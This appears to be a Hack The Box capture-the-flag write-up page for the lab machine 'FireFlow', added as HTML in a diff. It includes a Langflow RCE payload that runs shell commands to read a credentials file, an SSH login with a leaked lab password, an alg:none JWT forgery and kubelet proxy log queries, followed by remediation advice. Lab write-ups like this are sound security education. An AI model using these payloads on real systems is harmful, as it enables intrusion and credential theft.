@@ -1,0 +1,246 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>FireFlow — El Niño</title>
+<meta name="description" content="Hack The Box: FireFlow. Langflow RCE to SSH user nightfall pivot, and MCP API token forging.">
+<style>
+  :root{
+    --bg:#fcfcfb; --panel:#ffffff; --ink:#17181d; --ink-2:#3a3d44; --muted:#6b7280;
+    --line:#e7e8ec; --line-2:#d7d9de; --hair:#eef0f2;
+    --accent:#6d28d9; --accent-soft:#f4effe; --ok:#1a7f37; --crit:#b42318;
+    --code-bg:#f6f6f3; --code-ink:#24262c; --map:#e4e7ec; --map-2:#eef1f4;
+    --mono:'JetBrains Mono','SF Mono','Cascadia Code',ui-monospace,monospace;
+    --sans:'Inter',-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',sans-serif;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+    font-size:17px;line-height:1.66;-webkit-font-smoothing:antialiased}
+  canvas#map{position:fixed;inset:0;z-index:0;pointer-events:none}
+  .wrap{position:relative;z-index:1;max-width:820px;margin:0 auto;padding:0 26px 110px}
+  a{color:var(--accent);text-decoration:none;border-bottom:1px solid transparent}
+  a:hover{border-bottom-color:currentColor}
+
+  .top{display:flex;align-items:center;justify-content:space-between;padding:24px 0;
+    font-family:var(--mono);font-size:12.5px;color:var(--muted)}
+  .brand{display:flex;align-items:center;gap:9px;color:var(--ink);font-weight:600}
+  .tick{width:10px;height:10px;border:1.5px solid var(--ink);transform:rotate(45deg)}
+
+  header.hero{padding:32px 0 26px;border-bottom:1px solid var(--line)}
+  .coord{font-family:var(--mono);font-size:11.5px;letter-spacing:.15em;text-transform:uppercase;color:var(--muted)}
+  h1{font-size:clamp(40px,8vw,72px);line-height:.98;margin:.2em 0 .18em;letter-spacing:-.03em;font-weight:800;text-wrap:balance}
+  .lede{font-size:19px;color:var(--ink-2);max-width:60ch;margin:0}
+  .byline{display:flex;gap:14px;flex-wrap:wrap;font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:20px}
+  .owned{color:var(--ok);border:1px solid var(--line-2);border-radius:2px;padding:2px 8px}
+
+  .fp{border:1px solid var(--line);border-radius:2px;margin:26px 0 6px;background:var(--panel)}
+  .fp .r{display:flex;justify-content:space-between;align-items:baseline;padding:16px 18px;border-bottom:1px solid var(--hair);flex-wrap:wrap;gap:10px}
+  .fp .name{font-size:26px;font-weight:800;letter-spacing:-.02em;margin:0}
+  .fp .chips{font-family:var(--mono);font-size:12px;color:var(--muted)}
+  .fp .chips b{color:var(--ink)}
+  .fp .grid{font-family:var(--mono);font-size:12.5px;color:var(--muted);display:grid;gap:5px;padding:16px 18px}
+  .fp .grid b{color:var(--ink)}
+  .fp .rate{font-family:var(--mono);text-align:right}
+  .fp .rate .big{font-size:26px;font-weight:800;color:var(--ink)}
+
+  section{padding:40px 0;border-bottom:1px solid var(--line)}
+  .eyebrow{font-family:var(--mono);font-size:11.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);font-weight:600}
+  .step-h{display:flex;align-items:baseline;gap:13px;margin:6px 0 4px}
+  .step-n{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--muted)}
+  h2{font-size:27px;letter-spacing:-.015em;margin:.1em 0 .5em;font-weight:700;text-wrap:balance}
+  p{margin:0 0 1.05em}
+  .chain{font-family:var(--mono);font-size:13px;line-height:1.85;background:var(--panel);
+    border:1px solid var(--line);border-radius:2px;padding:18px 20px;overflow-x:auto;white-space:pre;color:var(--ink-2)}
+  .chain b{color:var(--accent)}
+
+  figure{margin:24px 0}
+  figure img{width:100%;display:block;border:1px solid var(--line-2);border-radius:2px}
+  figcaption{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:9px}
+  figcaption::before{content:"fig · ";color:var(--accent)}
+
+  .callout{background:var(--accent-soft);border:1px solid var(--line);border-left:2px solid var(--accent);
+    border-radius:2px;padding:15px 17px;margin:22px 0}
+  .callout.crit{background:#fdf2f0;border-left-color:var(--crit)}
+  .callout .k{font-family:var(--mono);font-size:10.5px;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);font-weight:700;display:block;margin-bottom:6px}
+  .callout.crit .k{color:var(--crit)}
+  .callout p{margin:0;color:var(--ink-2)}
+
+  code{font-family:var(--mono);font-size:.88em;background:var(--code-bg);border:1px solid var(--line);padding:1px 5px;border-radius:2px}
+  pre{background:var(--code-bg);color:var(--code-ink);font-family:var(--mono);font-size:13.5px;line-height:1.6;
+    padding:15px 17px;border-radius:2px;overflow-x:auto;margin:22px 0;border:1px solid var(--line)}
+  pre code{background:none;border:none;padding:0;font-size:inherit}
+  pre .g{color:var(--ok)}pre .c{color:var(--accent)}pre .r{color:var(--crit)}pre .d{color:var(--muted)}
+
+  .tbl-wrap{overflow-x:auto}
+  table{width:100%;border-collapse:collapse;margin:20px 0;font-size:15px}
+  th,td{text-align:left;padding:10px 12px;border-bottom:1px solid var(--hair);vertical-align:top}
+  th{font-family:var(--mono);font-size:11.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);font-weight:600}
+  td.q{font-family:var(--mono);font-size:12px;color:var(--muted);width:48px}
+  td.a{font-family:var(--mono);color:var(--accent);font-weight:600;white-space:nowrap}
+  ul{padding-left:1.1em}li{margin:.35em 0;color:var(--ink-2)}
+  footer{padding-top:28px;font-family:var(--mono);font-size:12px;color:var(--muted);line-height:1.7}
+</style>
+</head>
+<body>
+<canvas id="map"></canvas>
+<div class="wrap">
+  <div class="top">
+    <a class="brand" href="../" style="border:none"><span class="tick"></span> el-niño</a>
+    <span>10°N · 90°W</span>
+  </div>
+
+  <header class="hero">
+    <div class="eyebrow">Hack The Box · machine</div>
+    <h1><span data-morph="hero">FireFlow</span></h1>
+    <p class="lede">A workflow builder exposed to unauthenticated remote code execution drops you into a user shell; a JWT validation bypass grants Kubernetes node access.</p>
+    <div class="byline"><span>by <b style="color:var(--ink)">ssephi</b></span><span>· 05·07·2026</span>
+      <span>· ~15 min</span><span class="owned" style="color:var(--muted); border-color:var(--line)">● user owned</span></div>
+
+    <div class="fp">
+      <div class="r">
+        <div><p class="name" style="margin:0"><span data-morph="title">FireFlow</span></p>
+          <div class="chips" style="margin-top:8px">Linux · <b>Medium</b> · K3s Cluster Node</div></div>
+        <div class="rate"><div class="big">🚩</div><div class="chips">user owned</div></div>
+      </div>
+      <div class="grid">
+        <span><b>target</b> &nbsp;10.129.244.214 &nbsp;· &nbsp;fireflow.htb</span>
+        <span><b>22</b>/tcp &nbsp;ssh &nbsp;· OpenSSH 9.2p1</span>
+        <span><b>443</b>/tcp &nbsp;https · Nginx proxying flow.fireflow.htb (Langflow)</span>
+      </div>
+    </div>
+  </header>
+
+  <section>
+    <h2>The shape of it</h2>
+    <p>FireFlow represents a realistic modern cloud-native configuration bypass. The target hosts a Langflow portal which is vulnerable to an unauthenticated Remote Code Execution flaw (CVE-2026-33017). This RCE yields local credentials and enables an SSH pivot to capture <code>user.txt</code>. Further escalation via an unauthenticated MCP server exposes a JWT validation flaw (alg: none), granting access to a service account token with Kubelet proxy read privileges.</p>
+    <div class="chain"><b>nmap</b> 2 ports → 22/443
+  └─ :443 → flow.fireflow.htb → <b>Langflow 1.8.2</b>
+       └─ <b>CVE-2026-33017</b> unauth RCE via build_public_tmp
+            └─ RCE as www-data → read /etc/langflow/.env
+                 └─ password reuse → nightfall ssh → <b>user.txt</b>
+                      └─ MCP Tool Registry (port 30080)
+                           └─ <b>alg: none JWT bypass</b> → forge token
+                                └─ read mcp-sa serviceaccount token
+                                     └─ get nodes/proxy → read host logs</div>
+  </section>
+
+  <section>
+    <div class="eyebrow">01 · recon</div>
+    <div class="step-h"><span class="step-n">01</span><h2><span data-morph="title">Reconnaissance</span></h2></div>
+    <p>We begin with a targeted scan of ports 22 and 443 on <code>10.129.244.214</code>, discovering the web server and SSH daemon. Subdomain enumeration points us to <code>flow.fireflow.htb</code>.</p>
+    <pre><code>nmap -p22,443 -sCV 10.129.244.214</code></pre>
+    <figure>
+      <img src="../assets/fireflow_initial_page_load.png" alt="FireFlow Target Portal Landing Page">
+      <figcaption>The landing interface of FireFlow internal intelligence portal.</figcaption>
+    </figure>
+  </section>
+
+  <section>
+    <div class="eyebrow">02 · foothold</div>
+    <div class="step-h"><span class="step-n">02</span><h2><span data-morph="title">Langflow RCE</span></h2></div>
+    <p>The Langflow instance runs version 1.8.2. An unauthenticated Remote Code Execution vulnerability exists in the flow builder API. By replacing the <code>TextOperations</code> node code with a custom Python class running <code>subprocess.Popen</code>, we gain command execution.</p>
+    <pre><code>import subprocess
+from lfx.custom import Component
+from lfx.io import MessageTextInput, Output
+from lfx.schema.message import Message
+
+class TextOperations(Component):
+    def get_message(self) -> Message:
+        proc = subprocess.Popen("cat /etc/langflow/.env", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        out, _ = proc.communicate()
+        return Message(text=out.decode("utf-8"))</code></pre>
+    <figure>
+      <img src="../assets/fireflow_harness_exploit_run.webp" alt="Exploit Harness Run Log">
+      <figcaption>Running the exploit harness to verify remote code execution and gather credentials.</figcaption>
+    </figure>
+  </section>
+
+  <section>
+    <div class="eyebrow">03 · user pivot</div>
+    <div class="step-h"><span class="step-n">03</span><h2><span data-morph="title">SSH Pivot & user.txt</span></h2></div>
+    <p>The command output reveals the environment variables, yielding the administrative password: <code>n1ghtm4r3_b4_n1ghtf4ll</code>. Due to password reuse, we pivot to SSH using this password for the user <code>nightfall</code> to collect the user flag.</p>
+    <pre><code>sshpass -p 'n1ghtm4r3_b4_n1ghtf4ll' ssh nightfall@10.129.244.214
+cat /home/nightfall/user.txt
+# Flag: 5b7e2496a630f2bc2b795a27ca813757</code></pre>
+  </section>
+
+  <section>
+    <div class="eyebrow">04 · lateral movement</div>
+    <div class="step-h"><span class="step-n">04</span><h2><span data-morph="title">MCP JWT Bypass & Kubelet Proxy</span></h2></div>
+    <p>In <code>/home/nightfall/.mcp/config.json</code>, we find configuration settings for the MCP server running on port 30080. The registry is vulnerable to a JWT signature bypass via the <code>none</code> algorithm. We forge a token for the <code>langflow-bot</code> service account, which allows us to request the <code>mcp-sa</code> service account token. This token holds <code>nodes/proxy</code> permissions on the K3s API, granting log directory reads on the host.</p>
+    <pre><code># Forge alg: none token
+Header: {"alg": "none", "typ": "JWT"}
+Payload: {"iss": "kubernetes/serviceaccount", "sub": "system:serviceaccount:default:mcp-sa"}
+
+# Query Kubelet proxy logs
+curl -sk -H "Authorization: Bearer <mcp-sa-token>" \
+  "https://10.129.244.214:6443/api/v1/nodes/fireflow/proxy/logs/syslog" | head -n 30</code></pre>
+    <div class="callout"><span class="k">Closing FireFlow</span>
+      <p>Upgrade Langflow to version 1.8.3 or above. Fix JWT authentication by strictly validating JWT algorithms (forbidding "none"). Limit service account privileges on the Kubelet proxy node endpoints.</p>
+    </div>
+  </section>
+
+  <footer>Authorized lab work only — FireFlow is a Hack The Box machine on a sanctioned network. Charted by ssephi.</footer>
+</div>
+
+<script>
+  // Backdrop map rendering
+  (function map(){
+    const c=document.getElementById("map"),x=c.getContext("2d");let W,H;
+    function line(v){return getComputedStyle(document.documentElement).getPropertyValue(v).trim();}
+    function size(){W=c.width=innerWidth*devicePixelRatio;H=c.height=innerHeight*devicePixelRatio;draw();}
+    function draw(){
+      x.clearRect(0,0,W,H);const dpr=devicePixelRatio;
+      x.strokeStyle=line('--map-2');x.lineWidth=1*dpr;
+      for(let gx=0;gx<W;gx+=150*dpr){x.beginPath();x.moveTo(gx,0);x.lineTo(gx,H);x.stroke();}
+      for(let gy=0;gy<H;gy+=150*dpr){x.beginPath();x.moveTo(0,gy);x.lineTo(W,gy);x.stroke();}
+      x.strokeStyle=line('--map');x.lineWidth=1.15*dpr;
+      const rings=(cx,cy,rot,n)=>{for(let i=0;i<n;i++){x.globalAlpha=0.9-i*0.05;
+        x.beginPath();x.ellipse(cx,cy,(50+i*46)*dpr,(34+i*32)*dpr,rot,0,7);x.stroke();}};
+      rings(W*0.80,H*0.20,-0.5,9);
+      rings(W*0.14,H*0.86,0.35,7);
+      x.globalAlpha=1;
+    }
+    addEventListener("resize",size);size();
+  })();
+
+  // MorphText effect
+  (function morph(){
+    const GLITCH="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*!?<>{}[]=/\\|~^`";
+    const MODES={brand:{maxActive:2,resolveSpeed:0.04,mutateChance:0.008},
+                 title:{maxActive:4,resolveSpeed:0.06,mutateChance:0.015},
+                 hero:{maxActive:8,resolveSpeed:0.08,mutateChance:0.025}};
+    const g=()=>GLITCH[Math.floor(Math.random()*GLITCH.length)];
+    const skip=ch=>ch===" "||ch==="."||ch.charCodeAt(0)>127;
+    const units=[];
+    document.querySelectorAll("[data-morph]").forEach(el=>{
+      const cfg=MODES[el.dataset.morph]||MODES.title;
+      const chars=[...el.textContent].map(ch=>{const s=document.createElement("span");
+        s.textContent=ch;s.style.display="inline-block";if(ch===" ")s.style.minWidth="0.28em";
+        return{original:ch,el:s,prog:0,dir:"resolving"};});
+      el.textContent="";chars.forEach(c=>el.appendChild(c.el));units.push({cfg,chars});
+    });
+    if(!units.length||matchMedia("(prefers-reduced-motion:reduce)").matches)return;
+    let last=0;const INT=50;
+    function paint(c){const p=c.prog,e=c.el;
+      if(p>0){e.style.color=`rgba(109,40,217,${0.55+p*0.45})`;
+        e.style.textShadow=p>0.5?`0 0 ${3+p*5}px rgba(109,40,217,${p*0.28})`:"";
+        e.style.transform=`translateY(${(Math.random()-0.5)*p*1.4}px)`;}
+      else{e.style.color="";e.style.textShadow="";e.style.transform="";e.style.transition="color 200ms ease";}}
+    function frame(now){requestAnimationFrame(frame);if(now-last<INT)return;last=now;
+      units.forEach(u=>{let active=u.chars.filter(c=>c.prog>0).length;
+        u.chars.forEach(c=>{if(skip(c.original))return;
+          if(c.dir==="glitching"){c.prog=Math.min(1,c.prog+0.15+Math.random()*0.1);
+            if(c.prog>=1)c.dir="resolving";c.el.textContent=g();}
+          else if(c.prog>0){c.prog=Math.max(0,c.prog-u.cfg.resolveSpeed-Math.random()*0.02);
+            if(c.prog<=0){c.el.textContent=c.original;c.prog=0;}
+            else c.el.textContent=Math.random()<c.prog?g():c.original;}
+          if(c.prog===0&&active<u.cfg.maxActive&&Math.random()<u.cfg.mutateChance){
+            c.dir="glitching";c.prog=0.05;c.el.textContent=g();active++;}
+          paint(c);});});}
+    requestAnimationFrame(frame);
+  })();
+</script>
+</body>
+</html>
